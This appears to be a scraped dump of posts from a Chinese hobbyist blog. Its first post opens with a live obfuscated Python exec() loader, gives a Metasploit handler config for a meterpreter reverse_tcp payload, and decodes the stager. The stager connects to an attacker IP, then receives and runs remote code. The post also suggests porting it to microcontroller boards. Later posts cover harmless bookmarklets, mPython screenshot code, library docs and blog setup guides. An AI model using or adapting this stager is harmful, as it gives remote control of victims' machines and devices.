exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9T8FKxDAQPTdfkVsSjKFZuissVhDxICILrjcRaZNRQ9M0JFmtK/67DVlkYIb35s2bGTP6KSQcJzVA4kdret53ETYNjykcVOLJjIDepoBnbBwOnXsHKmu2RVUK30uuYluGRSl0xU94v7u5f90/Pd5eP7CsE2pyDlSilMjVhaiXkIRL2awly4I+QDegCmYFPmXnvFpEC+DpmiHblovEwflODZRc3REeRQD1SRvGnusXpNsTtgx9fRgL2IKjml3axU6f/XfPC80QzKBoflpoUNPoA8RIy/+i3zSZ1JCV/IdEso2/DP0BLLxehQ==')[0]))) ┌──(kali㉿kali)-[~] └─$ cat python-meterpreter-staged-reverse-tcp-11451-py.rc # # [Kali]: msfdb start; msfconsole -q -r '/home/kali/python-meterpreter-staged-reverse-tcp-11451-py.rc' # use exploit/multi/handler set PAYLOAD python/meterpreter/reverse_tcp set LHOST 127.0.0.1 set LPORT 11451 set ExitOnSession false set EnableStageEncoding true #set AutoRunScript 'post/windows/manage/migrate' run -j Tip:在Python平台下，不支持创建STAGELESS模式的恶意代码 去掉恶意代码的exec()，放入REPL内执行并print看看： PS C:\\Users\\user\\Downloads&gt; python Python 3.10.5 (tags/v3.10.5:f377153, Jun 6 2022, 16:14:13) [MSC v.1929 64 bit (AMD64)] on win32 Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &gt;&gt;&gt; print(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9T8FKxDAQPTdfkVsSjKFZuissVhDxICILrjcRaZNRQ9M0JFmtK/67DVlkYIb35s2bGTP6KSQcJzVA4kdret53ETYNjykcVOLJjIDepoBnbBwOnXsHKmu2RVUK30uuYluGRSl0xU94v7u5f90/Pd5eP7CsE2pyDlSilMjVhaiXkIRL2awly4I+QDegCmYFPmXnvFpEC+DpmiHblovEwflODZRc3REeRQD1SRvGnusXpNsTtgx9fRgL2IKjml3axU6f/XfPC80QzKBoflpoUNPoA8RIy/+i3zSZ1JCV/IdEso2/DP0BLLxehQ==')[0])).decode()) import socket,zlib,base64,struct,time for x in range(10): # 循环为链接攻击者 try: s=socket.socket(2,socket.SOCK_STREAM) s.connect(('攻击者IP',端口)) break except: time.sleep(5) l=struct.unpack('&gt;I',s.recv(4))[0] d=s.recv(l) while len(d)&lt;l: d+=s.recv(l-len(d)) exec(zlib.decompress(base64.b64decode(d)),{'s':s}) &gt;&gt;&gt; 大致分析，即为以下几步 尝试连接攻击者10次 连接后，接受一次消息，确认即将接受并执行的payload的总长度 再次进行一次获取消息，此时获取的是用于进行控制的payload 使用循环作再次接受payload，确保payload接收完毕 执行payload，并将与攻击者链接的socket传入代码内，便于其他操作 这段代码经过简单修改，即可适用于掌控版，此处因篇幅原因不再列出，提供一下可修改点便于看官自行实践： 更换模块base64为ubinascii.a2b（或b2a）_base64 使用模块_thread多线程防止阻塞 更换所有模块为适用于microPython的u xxxxx，例如socket -&gt; usocket等 原payload长度1784line，需要根据掌控版特性/硬件进行代码修改缩减或完全重写，例如咱就不需要getsystem命令和webcam开头的命令 ","link":"https://gxxk.site/vvRbZpds4/"},{"title":"记录一下自己用到的一些小工具","content":"如题，简单记录一下免安装的一些网页小工具（100%安全！） (持续更新中....?) 视频播放工具箱 其实主要就是就是可以快捷调整倍速这个功能，无聊，于是把一堆好玩（没用（划掉））的功能给搞了进 javascript:userInput=prompt(&quot;---视频播放工具箱---\\n请输入需要使用的选项(使用序号标注，可选输入：1-6之间的数)：\\n 倍速设置\\n 视频播放进度修改\\n 暂停时自动播放\\n 禁用播放器的pause函数\\n 播放视频\\n 强制暂停视频（4选项启用后仍可使用）&quot;);if(userInput==1){try{document.querySelector(&quot;video&quot;).playbackRate=parseInt(prompt(&quot;请输入要调整的视频倍速：0.1~16&quot;));alert(&quot;已成功将使用 `&lt;video&gt;` 标签的视频调整为指定倍速&quot;)}catch(error){alert(&quot;调整失败！请输入正确的值！&quot;)}};if(userInput==2){try{document.querySelector(&quot;video&quot;).currentTime=parseFloat(prompt(&quot;请输入指定时间（以秒为单位，可使用小数点）&quot;))}catch(error){alert(&quot;调整失败！请确保输入的是否是正确的数据！&quot;)}}if(userInput==3){document.querySelector(&quot;video&quot;).addEventListener(&quot;pause&quot;,function(){document.querySelector(&quot;video&quot;).play()});alert(&quot;启用成功！如刷新页面，此功能将消失&quot;)}if(userInput==4){PauseFunc=document.querySelector(&quot;video&quot;).pause; document.querySelector(&quot;video&quot;).pause=function(){};alert(&quot;启用成功！如刷新页面，此功能将消失&quot;)}if(userInput==5){document.querySelector(&quot;video&quot;).play()}if(userInput==6){PauseFunc()} 网页翻译 来源于我在Gitee上看见的一个很优秀的开源项目，可实现HTML全自动翻译为指定语言 项目传送门：https://gitee.com/mail_osc/translate 然后在这一栏中，给出了一个对于非开发者用户使用的代码，于是经过我极少量修改后拿来用了（见下方） https://gitee.com/mail_osc/translate/blob/master/doc/README.cn.md#先拿别人的网站动手试试 下边是代码： javascript:try{dom=document.getElementById(&quot;translate&quot;);dom.parentNode.removeChild(dom);}catch(error){var head= document.getElementsByTagName('head')[0]; var script= document.createElement('script'); script.type= 'text/javascript'; script.src= 'https://res.zvo.cn/translate/inspector_v2.js'; head.appendChild(script);} 这个里面我还加了一个功能：加载翻译窗口后，再执行一次会关闭原来的翻译窗口 外挂聊天室 此“外挂”非你们想的那个vape/wurst之类的游戏作弊软件，而是字面意义上的外挂（外置的网站聊天室） 此工具出处:https://ld246.com/article/1534741351807?r=icheer 下边是代码： javascript:var s=document.createElement('script');s.src='//topurl.cn/chat.js';document.body.append(s); 网页控制台 这个是基于由腾讯编写的前端轻量网页开发控制台（很绕对不对？理解成一个很牛x的到处都能用的网页修改器就ok了）vConsole而来的 vConsole项目链接：https://gitee.com/Tencent/vConsole 这里我们按照常规操作，先创建一个JS对象，指定代码来源网址（src属性），然后添加到网页内，等待几秒后运行 代码： javascript:var s=document.createElement('script');s.src='//unpkg.com/vconsole@latest/dist/vconsole.min.js';document.body.append(s);setTimeout(function(){var vConsole = new window.VConsole();},5000) 其中的5000是延时时间，单位为毫秒，代码导入开始到结束是有一段时间的，这段时间动不了模块内的函数，所以需要做延时处理 当然，上边这堆东西，直接添加到书签内，或者在打开页面后把代码粘贴到地址栏内回车运行，都可以使用 遇到Bug: 所有小脚本都经过本人实质性验证，有基础的可以自行尝试把代码放到DevTools内执行分析Bug，一般情况下出现xxxx未定义，一般是这个脚本需要导入外部的另一个脚本，在没有导入完成的时候，代码刚好直接启动外部脚本，建议划到页面最开始的地方等待脚本加载，如果还出错误，大概率是CSP的锅，这个是个网站安全规则的设置问题，部分相对而言安全的网站有可能启用了CSP，这玩意可以防攻击，但是加载从JS导入外部脚本并且脚本所在位置不是网站的地址的话，这个导入就会有可能被ban掉 ","link":"https://gxxk.site/9NcwXevnf/"},{"title":"记一下关于掌控版实现截屏的研究","content":"多图预警 开头 6.20下午1点左右，在STFP钉钉总群内（后面提到的聊天内容若无特殊注明基本都在这个群里），群友“emo的程序大神”（在U圈子内名称为“沉默”，后面简称emo）提出了想法： 群友“Mask”（U圈子站长，后面简称“Mask”）和emo一起明确了具体实现方法： oled库特性 oled类继承了哪些类 大致来讲就是大家通过查成分（bushi）查到了oled库是继承ssd1106_i2c类而来，ssd1106_i2c类是继承类framebuffer而来，所以很多framebuffer/ssd1106内的函数，都可以在oled库内使用到，而其中有1个比较重要的点： 小提示 Tips: framebuf和framebuffer在文中指的是2个不同的概念，framebuffer是模块（屏幕绘图缓冲区模块），framebuf是一个需要初始化的类，包含在framebuffer内 pixel函数 并且，我们发现了函数pixel()，它集成在framebuf类里面，掌控版的中文文字显示函数DispChar()就是基于pixel()函数，在不指定颜色的情况下，还可以得到x,y像素点的状态（0黑1白） 由此，我们想出了2种路线： 函数套壳法 此部分仅在理论上成立，未完全实际检验成果！ 函数套壳，乍一听很抽象，其实就是把原来的函数定义成一个变量内，再定义一个和原来函数同名的函数，这个函数内可以对函数传参做处理，然后再调用原函数 是不是很抽象？看一下代码就明白了！ 函数套壳-介绍 这是原代码： def hello(name): print(f&quot;你好，{name}&quot;) # f&quot;xxx{变量名}xxx&quot;是新版Python产生的format函数的新一种写法（个人理解），可以写成&quot;xxx&quot;+变量名+&quot;xxx&quot; 使用hello(&quot;小明&quot;)调用后返回： 你好，小明 我需要一个日志功能，在每次打印问候语时前面都标注出用户执行了hello函数，在问候谁（？），那么我们可以在不能修改原来已经定义好，无法修改源代码的函数上套一层壳，就像这样： def hello(name): print(f&quot;你好，{name}&quot;) # 假设从这里到代码开始的部分不能修改 hello_=hello # 转移原来的函数 def hello(name): print(f&quot;[日志]执行函数：hello，name参数内容：{name}&quot;) hello(name) 现在再使用hello(&quot;小明&quot;)调用后返回： [日志]执行函数：hello，name参数内容：小明 你好，小明 没错，你已经正确理解了函数套壳的意思，但是它似乎看起来没什么卵用，没关系，本文讲的掌控版截屏中的这个实现方法，就是基于函数套壳而来的（在这层壳里记载绘制函数在什么时候被调用），但是因为作者太懒，不想写这部分代码，参数太难搞了，所以另辟蹊径，采用了一个笨方法（具体见方法：遍历屏幕法） 遍历屏幕法 顾名思义，就是反复执行oled.pixel()函数128*64(8192)次，得出每个像素点的状态，然后存在一个二位数组内，算法简单暴力，想出这个算法后很快就有了最初的实现： [[oled.pixel(j,i) for j in range(128)] for i in range(64)] 没错，就是这么简单粗暴，2s内完成（其他实现方法需要7s甚至更多），但是这么个小东西却占用了70kb的RAM，紧接着，emo的截屏程序也诞生了，他的程序会直接将数据逐行扫描，写入pbm格式的文件中这里就直接挂张图，各位细看吧 这个执行要7s，内存占用还没有测试，但是应该小多了，可以直接集成到大型程序内且不需要预编译程序 还有一部分优化版本，这些可以在U圈子内发个贴找其他人要程序 ","link":"https://gxxk.site/mz6lEJuK9/"},{"title":"GxxkAPI帮助文档","content":" 该插件目前还处于测试阶段，帮助文档可能会有疏漏，出现任何Bug直接在LabPlus论坛评论区留言即可！ GxxkAPI是由Gxxk开发的，基于硬件掌控版，固件microPython，的一款工具箱，集成了很多原本掌控版/microPython所没有的功能 下载GxxkAPI 在内测群或最新版GxxkAPI下载GxxkAPI安装脚本，刷入后将会自动安装 加入GxxkAPI内测群 GxxkAPI更新进度缓慢，新特性往往无法快速使用，这时您可以选择加入内测群，与我（作者）直接沟通，反馈Bug 加入内测钉钉群 群号：33450012123 内测群群规 欢迎来到GxxkAPI内测群！ 您在群内应当将自己的群昵称改为论坛名，否则将踢出群聊 本群不允许以任何形式在群内对其他成员进行侮辱，请友好交流 允许在本群以外的位置传播GxxkAPI内测版本，但是不应过度占用论坛公共资源，如将每个经过修改的内测版本发在帖子内（一个文件一张帖子的形式） GxxkAPI是闭源的，禁止在无授权的情况下反编译/二次分发/二次修改GxxkAPI源码 如您违反了群规，我们将会视情况做出相应的处罚，包括但不限于： 5min-30day的禁言 在LabPlus论坛发帖公示违规行为和对应的论坛用户名 如情节严重，我们将会联合STFP、CiBX.等将您加入黑名单 最后，祝您玩的愉快！ 初始化GxxkAPI GxxkAPI需要使用from GxxkAPI import GxxkAPI导入模块，GxxkAPI被设计为需要使用GxxkAPI.GxxkAPI.__init__()函数来进行初始化，在此之前，GxxkAPI模块的命名空间内除了私有函数，使用的模块等对象以外，只有GxxkAPI类可以进行初始化，所有功能均存放在私有函数/类内，只有初始化后才可使用 具体实现代码： from GxxkAPI import * GxxkAPI=GxxkAPI() # 此时，您可以使用GxxkAPI进行编程了 文件是否存在-FileIsExists函数 前置条件：初始化GxxkAPI 作用： 检测目录/文件是否存在 需传入参数： filePath-需要检测的文件路径 返回值： （布尔值）True（文件存在）或False（文件不存在） 实例： if GxxkAPI.FileIsExists(&quot;/Dir/File&quot;): #此处路径可以使用/和\\\\，\\\\将被自动解析为/ print(&quot;文件存在！&quot;) else: print(&quot;文件不存在！&quot;) 配置文件-config类 前置条件：初始化GxxkAPI 作用： 更方便的配置操作 初始化方法： cfgClass=GxxkAPI.config(&quot;/configFilePath&quot;) #在此填写配置文件路径，\\将被自动解析为/ 写入配置-write函数 前置条件：初始化GxxkAPI并初始化config类 作用： 向指定文件写入配置 传参： 列表形式的配置文件，写入进文件时列表的每个元素将会单独写进一行中 没有返回值 实例： cfgClass.write([&quot;config1&quot;,True,[],114514]) 读取配置-read函数 前置条件：初始化GxxkAPI并初始化config类 作用： 向指定文件读取配置 无返回值/传参 实例： configData=cfgClass.read() 配置文件路径-cfgFilePath变量 前置条件：初始化GxxkAPI并初始化config类 作用：获取/修改config类指定的配置文件路径 无返回值/传参 修复mpy-FixMPyConnBug函数 前置条件：初始化GxxkAPI 作用：修复mpython_conn第三方库连接时导致的main.py无法加载的问题 无返回值/传参 运行Python文件-RunPyCodeFile函数 前置条件：初始化GxxkAPI 作用：运行Python(.py)代码文件 传参：filePath-文件路径，notUseTryExcept-不使用try...except捕获错误（可选，默认为False）,notUseCompileFunc-不编译函数（可选，默认为False） 返回值：一个字典，存放着运行代码后的产生的所有变量/函数的内容 执行代码-ExecCode函数 前置条件：初始化GxxkAPI 作用：运行Python代码文件（存储于字符串内） 传参：code-代码 返回值：一个字典，存放着运行代码后的产生的所有变量/函数的内容 等待用户操作-WaitUserCtrl函数 前置条件：初始化GxxkAPI 作用：等待用户操作 传参：mode-模式（分3种，touchpad-触摸板，button-按钮，all-前两种都检测） 无返回值 选择器-select函数 前置条件：初始化GxxkAPI 作用：选择options参数中的其中一个，并返回其索引 传参：options（列表形式，每个列表为一个字符串） 返回值：(被使用A选中的列表中的元素中的索引,&quot;A&quot;)或(被使用B选中的列表中的元素中的索引,&quot;B&quot;) 获取运存/闪存空间数据-GetFlashAndRAMInfo 前置条件：初始化GxxkAPI 作用：顾名思义，就是获取运行内存的数据和存储空间的数据 返回值：字典形式： { &quot;memoryFree&quot;:运行内存剩余可用空间，单位kb, &quot;flashFree&quot;:存储内存剩余可用空间，单位kb, &quot;flashSize&quot;:存储内存总共可用空间，单位kb } 无传参 更好的移除文件-RemoveFile函数 前置条件：初始化GxxkAPI 作用：自动识别需要删除的文件/目录并使用对应的删除文件的函数 传参：filePath-文件路径 无返回值 .tar.gz压缩文件解压-TarGzFileDecompress函数 前置条件：初始化GxxkAPI 作用：顾名思义，解压扩展名为.tar.gz的压缩文件 传参：filePath-targz压缩文件的位置，decompressDir-将压缩文件解压到对应目录的位置 无返回值 PPK文件解压-DecompressPPKFile类 获取PPK文件数据-GetPPKFileData函数 前置条件：初始化GxxkAPI 作用：顾名思义，获取文件的介绍信息/文件数据 传参：path-PPK文件路径,getInfo-是否获取PPK文件的信息（可选，默认为False） 返回值：PPK文件的数据，列表形式，每行一个列表元素，或PPK文件中标注的作者/名称/平台等信息（返回的内容基于参数getInfo，ZPPK文件读取数据返回值为bytes类型数据时） 解压PPK文件-decompress函数 前置条件：初始化GxxkAPI 作用：顾名思义，解压PPK文件 传参：ppkFilePath-PPK文件路径 无返回值 将ZPPK转换为PPK文件-ZPPK2PPK函数 前置：gxxkapi初始化 作用：将ZPPK文件转换为PPK文件（直接在原有文件上修改） 传参：ZPPK文件路径 无返回值 上电自动链接WiFi-PowerOnAutoConnectWiFi类 启用功能-enable函数 前置条件：初始化GxxkAPI 作用：在开机时强制链接WiFi，不检测任何数据（包括是否连接成功） 传参：wifissid-WiFi名称，wifipwd-WiFi密码 无返回值 禁用功能-disable函数 前置条件：初始化GxxkAPI并启用功能 作用：禁用在开机时强制链接WiFi这一功能 无返回值/传参 更新WiFi链接密码/SSID-update函数 前置条件：初始化GxxkAPI并启用功能 作用：更新WiFi连接时使用的名称/密码 传参：wifissid-WiFi名称，wifipwd-WiFi密码 无返回值 WiFi控制-wifi类 不需要初始化GxxkAPI类 使用from GxxkAPI import wifi即可使用 链接WiFi-connect函数 前置条件：导入本模块中的wifi类 作用：链接WiFi函数，但是能更改的东西更多 传参：ssid-WiFi名称，pwd-WiFi密码，WiFiIsCannotScan-WiFi是否不能被扫描到（可选，默认为False），checkWiFiIsConnect-连接后是否检查是否成功连接可选，默认为False），timeout-WiFi链接超时时间（可选，默认为10s(数字10)，如checkWiFiIsConnect为True，则此选项无效） 无返回值 断开WiFi-disconnect函数 前置条件：导入本模块中的wifi类 作用：断开WiFi 无返回值/传参 获取设备ID-GetDeviceID函数 前置条件：初始化GxxkAPI 无传参 作用：获取设备ID 返回值：一个十位的由大小写字母/数字组成的掌控版设备ID，基于Mac码生成而来 拆分字符串-cut函数 前置条件：初始化GxxkAPI 传参：一个字符串（需要被拆分的内容）和一个数字（每个被拆分的内容的长度） 作用：将一个字符串拆分为每个元素都有x个字符的列表（假设最后一个长度不足x，也会直接被添加进列表内） 返回值：被拆分后的列表 f&quot;{xxx}&quot;移植-BetterFormatStr函数 前置条件：初始化GxxkAPI 传参：一个字符串（需要被格式化的内容） 作用：将一个字符串使用format函数格式化，但是被“{}”包裹的内容就是格式化后的值本身 返回值：被格式化后的字符 可能有点抽象，举个例子： from GxxkAPI import GxxkAPI GxxkAPI=GxxkAPI() f=GxxkAPI.BetterFormatStr print(&quot;格式化前：{1+2+3}&quot;) # 打印：格式化前：{1+2+3} print(f(&quot;格式化后：{1+2+3}&quot;)) # 打印：格式化后：6 截屏-screenshot函数 前置条件：初始化GxxkAPI 传参：截屏路径，截屏模式（可选，默认为4），截屏坐标（可选且仅在模式3内生效） 作用：截取屏幕缓冲区内容，包括没有应用到屏幕上的内容 模式： 截屏共有以下几种模式： 数组格式 扫描屏幕（返回数组），占用RAM70KB左右，耗时2s 调用方法：screendata=GxxkAPI.screenshot(mode=1) 格式P1 扫描屏幕并写入进图片文件（pbm文件，P1格式，掌控版不可显示）内，耗时2s，RAM占用未知（非原创，作者emo的程序大神） 调用方法：GxxkAPI.screenshot(path=&quot;/image-mode2-p1.pbm&quot;,mode=2) 可设置截屏范围 扫描屏幕并写入进图片文件（pbm文件，P1格式，掌控版不可显示）（非原创，作者LP） 调用方法：GxxkAPI.screenshot(path=&quot;/image-mode3-p1.pbm&quot;,mode=3) 最优解 扫描屏幕并写进pbm格式P4的图片文件中（掌控版可显示），占用RAM至少小于25k，耗时1s左右 RAM占用低（相对于模式4） 大致核心算法与模式4相同，在原基础上让***（机密）的存储时间变得更长，防止内存碎片产生 是否是目录-IsDir函数 前置条件：初始化GxxkAPI 传参：需要判断的路径 作用：基于os.stat给出的文件类型位判断路径所指文件对象是不是目录 返回值：布尔值，代表是不是目录 是否是文件-IsFile函数 此函数已在第一次精简模块操作时被移除，需要使用not IsDir(path)达到相应效果 掌控版基本自主硬件资源移植 GxxkAPI将mpython库中的部分较重要的对象移植到了GxxkAPI内，您可以在不导入mpython的情况下使用部分自主硬件资源 前置条件：初始化GxxkAPI并且导入方式必须是from GxxkAPI import * OLED类移植/优化 GxxkAPI将OLED类移植了过来，并且对DispChar函数进行了优化，删去了mode参数，只留下reverse参数（2个模式+1模式（不显示字符背景disableCharBg）） 实例（最好还是自己去试试）： from GxxkAPI import * # 正常使用 oled.fill(0) oled.DispChar(&quot;Hello World!&quot;,0,0) oled.show() # 反色模式 oled.fill(0) oled.DispChar(&quot;Hello World!&quot;,0,0,reverse=True) oled.show() # 正常使用下禁用字符背景（啥也看不见，反色模式下也同理） oled.fill(1) oled.DispChar(&quot;Hello World!&quot;,0,0,disableCharBg=True) oled.show() 按钮 是machine.Pin返回的对象，没有was_pressed/is_pressed等函数，您可以使用button_a.value()==0判断是否按下 可用对象： button_a button_b 例子： def __Select(options:list, title:str)-&gt;tuple: target = 0 # 主循环 while True: # 绘制UI oled.fill(0) oled.hline(0, 15, 128, 1) oled.DispChar(title, 0, -1) oled.DispChar(options[target], 0, 16, reverse=True) # 反色模式绘制选中内容 try: oled.DispChar(options[target+1], 0, 32) oled.DispChar(options[target+2], 0, 48) except:pass oled.show() # 等待操作 GxxkAPI.wait() # 做出决策 if button_a.value()==0: return target, &quot;A&quot; elif button_b.value()==0: return target, &quot;B&quot; elif touchPad_P.read() &lt; 100: target -= 1 # 向上（左） elif touchPad_N.read() &lt; 100: target += 1 # 向下（右） if target == -1: target = len(options)-1 elif target==len(options): target=0 金手指（TouchPad） 是machine.TouchPad生成的对象，没有is_pressed/was_pressed等函数，但您可以使用touchPad_P.read()&lt;100判断是否按下，示例见上方 可用对象： touchPad_P touchPad_Y touchPad_T touchPad_H touchPad_O touchPad_N RGB灯珠（NeoPixel） 是模块NeoPixel生成的对象，和原版rgb完全相同，可以直接使用，具体方法详见mpython官方文档 AES算法对称数据加密-AESDataCryption 加密-encrypt函数 传参：需要加密的数据（字节/字符形式），密钥（字节形式，推荐使用os.urandom(您期望的密钥长度//8)生成），IV(字节形式，推荐使用os.urandom(16)生成) 作用：使用ucryptolib中的aes加密算法对数据进行加密 返回值：加密后的数据，Bytes类型 解密-decrypt函数 除了主要功能为解密内容外，其他属性都与encrypt函数一样 ","link":"https://gxxk.site/GxxkAPi/"},{"title":"搭博客少走弯路-Gridea添加基于不蒜子的访问量统计","content":"不蒜子是一款非常简洁，简单的计数器，无需登录，无需注册，也很小，只需将访问量代码添加到网站最下方底部信息（主题-底部信息）内即可使用，但是它只有PV/UV统计这一功能，适合轻度用户使用 官网：https://busuanzi.ibruce.info/ PS: 代码内的busuanzi_container开头的是用于给程序标注的访问量展示的部分，用于在加载失败时自动隐藏访问量统计 最简使用代码（PV）： &lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt; &lt;span id=&quot;busuanzi_container_site_pv&quot;&gt;本站总访问量&lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;/span&gt;次&lt;/span&gt; 全套使用代码（本站使用的代码，站点PV/UV，页面PV）： &lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt; 本站总访问量&lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;/span&gt;次 本站总访客数&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;/span&gt;位 本页总访问量&lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;次 ","link":"https://gxxk.site/yk76x5ZGr/"},{"title":" 搭博客少走弯路-GithubPage 百度SEO","content":" 本文从旧版博客迁移而来，可能不适用于Gridea，请知悉 前言 其实关于百度SEO优化的方面早就想搞了，但是因为GithubPage屏蔽了百度爬虫，这方面一直闲置着在，现在给博客引擎换成了hexo，方便了一些，而且hexo也有很多开箱即用的插件，很方便，所以现在经过一番摸索，找到了百度SEO优化的方法 教程 前置条件 博客引擎为Hexo 博客使用自定义域名 博客已备案（关于GithubPage的备案可以去买腾讯的Serverless备案资源包进行备案） 正文 安装Sitemap生成器，指令：npm install hexo-generator-sitemap --save （PS：之前看见一篇文章说要安装baidu版Sitemap生成器，其实这个可有可无，百度爬虫本身支持普通的sitemap的） 重新部署博客，指令： hexo clean hexo g hexo d 在https://ziyuan.baidu.com/linksubmit/index注意要先绑定站点，站点必须备案 在上一步的连接中选择普通收录-&gt;sitemap，在下面的输入框内输入：[站点域名]/sitemap.xml（或[站点域名]/sitemap.txt） 等待百度收录完成 收录完成，此时可以在百度搜索：site:[站点域名]查看百度收录的所有页面 设置固定链接 安装hexo-abbrlink，指令：npm install hexo abbrlink --save 在配置文件_config.yml中的# Directory上一行添加如下内容 abbrlink: alg: crc16 #算法： crc16(default) and crc32 rep: hex #进制： dec(default) and hex 生成时，会在文章开头格式化字段添加一行内容：abbrlink: '[根据算法生成的文章访问id]'，也可自行添加，自定义访问链接 关于每个算法对应的链接参考这里： crc16&amp;rep: 66c8 crc16&amp;dec: 65535 crc32&amp;hex: 8ddf18fb crc32&amp;dec: 1690090958 重新部署博客，指令： hexo clean hexo g hexo d Tip:固定链接有助于优化搜索引擎权重，所以abbrlink尽量不要随意更改 总结 GithubPage博客为什么不被百度收录：百度爬虫被GitHub屏蔽，SEO优化方法： 安装Sitemap生成器并重新部署博客： npm install hexo-generator-sitemap --save hexo clean hexo g hexo d 在https://ziyuan.baidu.com/linksubmit/index提交：[站点域名]/sitemap.xml 在百度搜索：site:[站点域名]确认网站是否被收录 设置固定链接： 安装abbrlink: npm install hexo abbrlink --save _config.yml配置文件添加： abbrlink: alg: crc16 #算法： crc16(default) and crc32 rep: hex #进制： dec(default) and hex ","link":"https://gxxk.site/xIomO_plB/"},{"title":"搭博客少走弯路-Hexo启用PWA","content":" 注：本文从旧版博客迁移而来，可能不适用于Gridea 前言 最近看到我朋友博客换主题了，点进这个主题介绍页，功能还蛮多的，其中支持PWA这一项就吸引了我的眼球，后来查了一下，本质上就是一个App，但是和传统App还是有很多区别的，其中就支持多平台，电脑、手机均可使用，同时可离线访问，便赶紧给自己博客加上，但大多都不适合新版本使用，如hexo-pwa，不支持hexo@4.2.0及以上的版本，最终翻了几篇教程，在实践了一下，总结出一片教程，可通过非插件方式让Hexo支持PWA 正文 准备工作 支持HTTPS的站点 网站各种分辨率的图标 教程 在[站点根目录]/source下新建文件 manifest.json，替换掉所有用[]包起来的部分（注意！配置文件内不要有任何注释！） { &quot;lang&quot;: &quot;zh-CN&quot;, &quot;name&quot;: &quot;[站点名称]&quot;, &quot;short_name&quot;: &quot;[站点短名称，建议和上面的站点名称一样]&quot;, &quot;description&quot;: &quot;[站点介绍]&quot;, &quot;theme_color&quot;: &quot;[主题色，如：#000000]&quot;, &quot;background_color&quot;: &quot;[应用开屏背景颜色，和上面那个填一样就行]&quot;, &quot;start_url&quot;: &quot;[应用启动第一个显示的页面，，填 / 就行]&quot;, &quot;Scope&quot;: &quot;[此配置文件的作用域，填 / 就行]&quot;, &quot;display&quot;: &quot;[应用显示模式，填 standalone 就行]&quot;, &quot;orientation&quot;: &quot;[应用的默认方向，填 any 就行]&quot;, &quot;icons&quot;: [{ &quot;src&quot;: &quot;[像素大小为60x60的网站图标的地址,png格式]&quot;, &quot;type&quot;: &quot;image/png&quot;, &quot;sizes&quot;: &quot;60x60&quot; },{ &quot;src&quot;: &quot;[像素大小为72x72的网站图标的地址,png格式]&quot;, &quot;type&quot;: &quot;image/png&quot;, &quot;sizes&quot;: &quot;72x72&quot; },{ &quot;src&quot;: &quot;[像素大小为96x96的网站图标的地址,png格式]&quot;, &quot;type&quot;: &quot;image/png&quot;, &quot;sizes&quot;: &quot;96x96&quot; },{ &quot;src&quot;: &quot;[像素大小为144x144的网站图标的地址,png格式]&quot;, &quot;type&quot;: &quot;image/png&quot;, &quot;sizes&quot;: &quot;144x144&quot; },{ &quot;src&quot;: &quot;[像素大小为144x144的网站图标的地址,png格式]&quot;, &quot;type&quot;: &quot;image/png&quot;, &quot;sizes&quot;: &quot;192x192&quot; },{ &quot;src&quot;: &quot;[像素大小为144x144的网站图标的地址,png格式]&quot;, &quot;type&quot;: &quot;image/png&quot;, &quot;sizes&quot;: &quot;512x512&quot; }] } 在博客主题模板文件（一般为layout.ejs）的最上方引入此配置文件（&lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot;&gt;） 在[站点根目录]/source新建sw.js const version = 'offline-cache-v1' self.addEventListener('install', function (event) { event.waitUntil(self.skipWaiting()); }); self.addEventListener('activate', function (event) { event.waitUntil( Promise.all([ self.clients.claim(), caches.keys().then(function (cacheList) { return Promise.all( cacheList.map(function (cacheName) { if (cacheName !== version) { return caches.delete(cacheName); } }) ); }) ]) ); }); self.addEventListener('fetch', function (event) { console.log('url is', event.request.url) event.respondWith( caches.match(event.request).then(function (response) { if (response) { return response; } var request = event.request.clone(); return fetch(request).then(function (httpRes) { if (!httpRes || httpRes.status !== 200) { return httpRes; } var responseClone = httpRes.clone(); caches.open(version).then(function (cache) { cache.put(event.request, responseClone); }); return httpRes; }); }) ); }) 在刚刚编辑的站点主体模板文件内插入的那行代码下插入以下代码（引入sw.js）： &lt;script&gt; if ('serviceWorker' in navigator) { window.addEventListener('load', function () { navigator.serviceWorker.register('/sw.js') .then(function (registration) { console.log('sw.js 注册成功', registration.scope); }) .catch(function (err) { console.log('sw.js 注册失败 ', err); }); }); } &lt;/script&gt; 重新部署即可查看效果 ","link":"https://gxxk.site/dn8xRQp4y/"},{"title":"搭博客少走弯路-Gridea实现HexoFluid同款Tag插件","content":" PS: 此类功能自己想要迁移也可以自行按照文中方法寻找 最近在迁移旧版博客文章时，发现Fluid主题有一个独占的功能，叫做Tag插件，官方是这样介绍的： 这个功能好用，美观，但是我在迁移文章时发现Gridea不支持这些功能，没办法，只能自己动手复刻 寻找CSS 按照之前添加萌百黑幕的经验，我决定先寻找此部分的CSS和JavaScript代码，果断进网站开DevTools查找，右键到Tag插件上，点击检查，是一个div，很干净，只给了一个class指定 大概率是把Tag插件的样式写在CSS/JS里面了，果断进行一波查找（纯静态建议直接在网页查找），JS没有，main.css却有19个匹配项，慢慢看，找到了具体的位置（我的在2001行），下面是全部Tag插件实现的CSS： .note { padding: .75rem; border-left: .35rem solid; border-radius: .25rem; margin: 1.5rem 0; color: var(--text-color); transition: color .2s ease-in-out; font-size: .9rem } .note a { color: var(--text-color); transition: color .2s ease-in-out } .note :last-child { margin-bottom: 0 } .note-primary { background-color: rgba(183,160,224,.25); border-color: #6f42c1 } .note-secondary,note-default { background-color: rgba(187,187,187,.25); border-color: #777 } .note-success { background-color: rgba(174,220,174,.25); border-color: #5cb85c } .note-danger { background-color: rgba(236,169,167,.25); border-color: #d9534f } .note-warning { background-color: rgba(248,214,166,.25); border-color: #f0ad4e } .note-info { background-color: rgba(160,197,228,.25); border-color: #428bca } .note-light { background-color: rgba(254,254,254,.25); border-color: #0f0f0f } 实装CSS 